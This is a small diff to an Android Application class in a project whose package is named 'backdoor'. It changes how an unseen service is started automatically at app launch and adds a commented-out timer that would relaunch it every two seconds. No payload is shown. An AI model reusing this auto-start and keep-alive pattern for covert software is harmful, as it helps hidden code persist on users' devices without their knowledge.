@@ -2,6 +2,7 @@ package com.voila.backdoor;
 import android.app.*;
 import android.content.*;
 import android.util.*;
+import java.util.*;
 
 public class init extends Application
 {
@@ -12,9 +13,21 @@ public class init extends Application
 		
 		super.onCreate();
 		Log.i("fuck","init");
-		Intent i=new Intent(this,srv.class);
-		//i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-		startService(i);
+		/*
+		Timer t=new Timer();
+		TimerTask tt=new TimerTask(){
+
+			@Override
+			public void run()
+			{
+				Intent i=new Intent(init.this,srv.class);
+				startService(i);
+				Log.i("fuck","istart");
+				// TODO: Implement this method
+			}
+		};
+		t.schedule(tt,2000,2000);
+		*/
 	}
 	
 }
